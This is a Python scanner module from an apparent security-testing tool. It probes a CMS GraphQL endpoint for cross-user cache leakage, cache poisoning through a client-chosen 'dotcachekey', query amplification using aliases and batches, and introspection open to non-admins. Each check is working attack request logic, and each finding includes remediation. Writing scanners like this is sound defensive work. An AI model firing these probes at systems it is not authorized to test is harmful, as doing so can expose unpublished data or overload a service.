"""GraphQL response-cache abuse — cross-user leakage, poisoning and amplification.

the target caches GraphQL responses in GraphqlCacheWebInterceptor. The cache key is
the `dotcachekey` parameter/header when supplied, otherwise the raw query text —
and in neither case does it include the CALLER. Two consequences follow:

  * Leakage: a response populated by a privileged user is served verbatim to an
    anonymous caller issuing the same query. Research on a live 26.x instance
    confirmed anonymous callers receiving `live:false` (unpublished) contentlets
    that only the admin query had produced.
  * Poisoning: because the key is attacker-supplied, one caller can deliberately
    seed or occupy another caller's key. The key is additionally `String.intern()`
    ed and synchronized on, which turns it into a JVM-wide lock-contention
    primitive.

Also checked here: absent depth/complexity instrumentation (array batching and
alias amplification), an uncapped `limit` argument, and introspection exposure to
non-admin identities.

Every check compares what DIFFERENT identities receive for the SAME query, so a
finding rests on an observed cross-identity difference rather than on a pattern.
"""
from __future__ import annotations

import json
from typing import Iterable, Optional

from ..models import Endpoint, Finding, Severity, VulnClass
from .base import Scanner, canary

_GQL_PATHS = ("/api/v1/graphql", "/api/graphql")

# A query for unpublished content. Anonymous callers must never receive rows.
_UNPUBLISHED_Q = ('{search(query:"+live:false +working:true +languageId:1" limit:5)'
                  '{identifier title}}')
_TRIVIAL_Q = "{search(query:\"+live:true\" limit:1){identifier}}"
_INTROSPECT_Q = "{__schema{types{name}}}"


def _rows(body: str) -> Optional[list]:
    """Extract search rows from a GraphQL response, or None if unparseable."""
    try:
        data = (json.loads(body or "{}") or {}).get("data") or {}
    except (ValueError, TypeError):
        return None
    if not isinstance(data, dict):
        return None
    for v in data.values():
        if isinstance(v, list):
            return v
    return None


class GraphQLCacheScanner(Scanner):
    """Cross-identity GraphQL cache leakage, poisoning and amplification."""

    name = "graphql_cache"
    vuln_classes = [VulnClass.AUTHZ.value, VulnClass.INFO_LEAK.value,
                    VulnClass.RATE_LIMIT.value]

    def applies_to(self, endpoint: Endpoint) -> bool:
        return endpoint.path in _GQL_PATHS and endpoint.method.upper() == "POST"

    # -- helpers ------------------------------------------------------------
    def _post(self, path: str, label: str, query: str, extra: Optional[dict] = None,
              raw_body: Optional[str] = None):
        ident = self.identities.get(label)
        if ident is None:
            return None
        headers = dict(self.auth.headers_for(ident))
        headers["Content-Type"] = "application/json"
        if extra:
            headers.update(extra)
        body = raw_body if raw_body is not None else json.dumps({"query": query})
        return self.client.request("POST", path, identity_label=label,
                                   headers=headers, data=body)

    def run(self, endpoint: Endpoint) -> Iterable[Finding]:
        path = endpoint.path
        anon = "anonymous" if "anonymous" in self.identities else None
        admin = next((l for l in ("admin",) if l in self.identities), None)
        low = next((l for l in ("backend", "readonly", "content_editor")
                    if l in self.identities), None)

        # ---- 1. cross-user cache leakage ---------------------------------
        # Bypass the cache for the anonymous baseline (dotcachettl:0) so we learn
        # what anonymous is ENTITLED to, then let the admin populate the cache,
        # then ask anonymously again through the cache.
        if anon and admin:
            base = self._post(path, anon, _UNPUBLISHED_Q, {"dotcachettl": "0"})
            adm = self._post(path, admin, _UNPUBLISHED_Q)
            after = self._post(path, anon, _UNPUBLISHED_Q)
            b_rows, a_rows, f_rows = (_rows(r.resp_body) if r else None
                                      for r in (base, adm, after))
            if (b_rows is not None and f_rows is not None
                    and len(f_rows) > len(b_rows) and a_rows):
                leaked = [r.get("identifier") for r in f_rows
                          if isinstance(r, dict)][:5]
                yield Finding(
                    vuln_class=VulnClass.AUTHZ, severity=Severity.HIGH,
                    title="GraphQL response cache is not scoped to the caller "
                          "(privileged results served to anonymous)",
                    endpoint=f"POST {path}",
                    description=(
                        f"The same GraphQL query returned {len(b_rows)} row(s) to an "
                        f"anonymous caller with caching bypassed, but {len(f_rows)} row(s) "
                        f"to the SAME anonymous caller after an administrator ran it. The "
                        f"cache key does not include the caller, so a response computed "
                        f"under administrative permissions is replayed to unauthenticated "
                        f"users. The query requested unpublished content "
                        f"(+live:false), so this discloses material that is not published. "
                        f"Leaked identifiers: {leaked}."),
                    evidence=[r for r in (base, adm, after) if r],
                    detail={"test": "graphql_cache_not_user_scoped",
                            "anonymous_baseline_rows": len(b_rows),
                            "anonymous_after_admin_rows": len(f_rows),
                            "leaked_identifiers": leaked,
                            "impact": ("Unauthenticated users receive content they are not "
                                       "entitled to, including unpublished drafts, whenever a "
                                       "privileged user has run the same query."),
                            "remediation": ("Include the caller's identity (user id and role "
                                            "set) in the GraphQL cache key, or disable response "
                                            "caching for authenticated queries."),
                            "cwe": "CWE-524",
                            "auto_confirm": {
                                "confirmed": True, "kind": "differential_observation",
                                "exploitability": "exploitable",
                                "reason": (f"the same query returned {len(b_rows)} row(s) to "
                                           f"anonymous with caching bypassed but {len(f_rows)} "
                                           f"row(s) to anonymous after an administrator ran it"),
                                "repro": ("POST the query anonymously with dotcachettl:0, then as "
                                          "admin, then anonymously again; compare row counts.")}},
                    confidence="firm", verdict="true_positive",
                    exploitability="exploitable")

        # ---- 2. attacker-controlled cache key (poisoning) -----------------
        if anon and admin:
            key = f"deluluscan-{canary('k')}"
            seeded = self._post(path, admin, _UNPUBLISHED_Q, {"dotcachekey": key})
            stolen = self._post(path, anon, _TRIVIAL_Q, {"dotcachekey": key})
            s_rows = _rows(stolen.resp_body) if stolen else None
            seed_rows = _rows(seeded.resp_body) if seeded else None
            # A hit means the anonymous caller got the ADMIN result for a query
            # it did not send.
            if seed_rows and s_rows and len(s_rows) == len(seed_rows) and len(s_rows) > 0:
                yield Finding(
                    vuln_class=VulnClass.AUTHZ, severity=Severity.HIGH,
                    title="GraphQL cache key is attacker-controlled (cache poisoning / "
                          "cross-user retrieval via dotcachekey)",
                    endpoint=f"POST {path}",
                    description=(
                        f"Supplying the 'dotcachekey' header lets a caller choose which cache "
                        f"entry to read or write. An administrator seeded key '{key}', then an "
                        f"anonymous caller sent a DIFFERENT, trivial query under the same key "
                        f"and received {len(s_rows)} row(s) matching the administrator's "
                        f"result. A caller can therefore both harvest another caller's cached "
                        f"response and poison the entry other callers will read."),
                    evidence=[r for r in (seeded, stolen) if r],
                    detail={"test": "graphql_cache_key_attacker_controlled",
                            "cache_key": key,
                            "impact": ("Cross-user data retrieval and cache poisoning. The key "
                                       "is also interned and synchronized on, so a caller can "
                                       "additionally contend a JVM-wide lock."),
                            "remediation": ("Do not accept a client-supplied cache key. Derive "
                                            "the key server-side from the normalised query plus "
                                            "the caller's identity."),
                            "cwe": "CWE-524",
                            "auto_confirm": {
                                "confirmed": True, "kind": "differential_observation",
                                "exploitability": "exploitable",
                                "reason": ("an anonymous caller sent a different, trivial query "
                                           "under an administrator-seeded cache key and received "
                                           "the administrator's result"),
                                "repro": ("Seed dotcachekey:K as admin, then request the same key "
                                          "anonymously with a trivial query.")}},
                    confidence="firm", verdict="true_positive",
                    exploitability="exploitable")

        # ---- 3. no depth/complexity limit (amplification) -----------------
        ident = low or anon or admin
        if ident:
            aliases = " ".join(
                f'a{i}:search(query:"+live:true" limit:200){{identifier}}'
                for i in range(25))
            amp = self._post(path, ident, "{" + aliases + "}")
            batch = self._post(path, ident, "", raw_body=json.dumps(
                [{"query": _TRIVIAL_Q} for _ in range(10)]))
            amp_ok = amp is not None and 200 <= amp.status < 300 and _rows(amp.resp_body) is not None
            batch_ok = False
            if batch is not None and 200 <= batch.status < 300:
                try:
                    batch_ok = isinstance(json.loads(batch.resp_body or ""), list)
                except (ValueError, TypeError):
                    batch_ok = False
            if amp_ok or batch_ok:
                bits = []
                if amp_ok:
                    bits.append("25 aliased search fields at limit:200 were executed in a "
                                "single request")
                if batch_ok:
                    bits.append("a 10-query JSON array batch was accepted and executed")
                yield Finding(
                    vuln_class=VulnClass.RATE_LIMIT, severity=Severity.MEDIUM,
                    title="GraphQL accepts unbounded query amplification "
                          "(no depth/complexity limit)",
                    endpoint=f"POST {path}",
                    description=(
                        f"As the '{ident}' identity, {'; '.join(bits)}. No query-depth or "
                        f"query-complexity instrumentation is enforced, so a single small "
                        f"request can multiply into many expensive index searches."),
                    evidence=[r for r in (amp, batch) if r],
                    detail={"test": "graphql_no_complexity_limit",
                            "alias_amplification": amp_ok, "array_batching": batch_ok,
                            "impact": ("A single request can be amplified into many backend "
                                       "searches, enabling denial of service at low cost."),
                            "remediation": ("Add MaxQueryDepthInstrumentation and "
                                            "MaxQueryComplexityInstrumentation, cap the 'limit' "
                                            "argument server-side, and bound or disable array "
                                            "batching."),
                            "cwe": "CWE-770",
                            "auto_confirm": {
                                "confirmed": True, "kind": "differential_observation",
                                "exploitability": "conditional",
                                "reason": "; ".join(bits),
                                "repro": ("Send 25 aliased search fields and a 10-query JSON "
                                          "array batch; both are executed.")}},
                    confidence="firm", verdict="true_positive",
                    exploitability="conditional")

        # ---- 4. introspection exposed to non-admins -----------------------
        if low:
            intro = self._post(path, low, _INTROSPECT_Q)
            if intro is not None and 200 <= intro.status < 300:
                try:
                    types = (((json.loads(intro.resp_body or "{}") or {}).get("data") or {})
                             .get("__schema") or {}).get("types") or []
                except (ValueError, TypeError, AttributeError):
                    types = []
                if len(types) > 5:
                    yield Finding(
                        vuln_class=VulnClass.INFO_LEAK, severity=Severity.LOW,
                        title="GraphQL introspection is available to any authenticated user",
                        endpoint=f"POST {path}",
                        description=(
                            f"The '{low}' identity retrieved the full GraphQL schema "
                            f"({len(types)} types), disclosing every content type and field "
                            f"including internal ones. Introspection is disabled for anonymous "
                            f"callers but not restricted to administrators."),
                        evidence=[intro],
                        detail={"test": "graphql_introspection_non_admin",
                                "type_count": len(types),
                                "impact": ("Discloses the complete content model to any "
                                           "authenticated user, easing targeted attacks."),
                                "remediation": ("Restrict introspection to administrators, or "
                                                "disable it outside development."),
                                "cwe": "CWE-200",
                                "auto_confirm": {
                                    "confirmed": True, "kind": "differential_observation",
                                    "exploitability": "conditional",
                                    "reason": (f"the '{low}' identity retrieved {len(types)} "
                                               f"schema types while anonymous cannot"),
                                    "repro": "Run the introspection query as a non-admin user."}},
                        confidence="firm", verdict="true_positive",
                        exploitability="conditional")
